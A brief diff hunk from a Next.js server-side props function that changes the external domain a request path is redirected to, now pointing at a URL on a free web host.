@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://alcashzone.com/` + encodeURI(path as string)
+					`https://mesic-reference.000webhostapp.com/graphql./` + encodeURI(path as string)
 				}`,
 			},
 		};
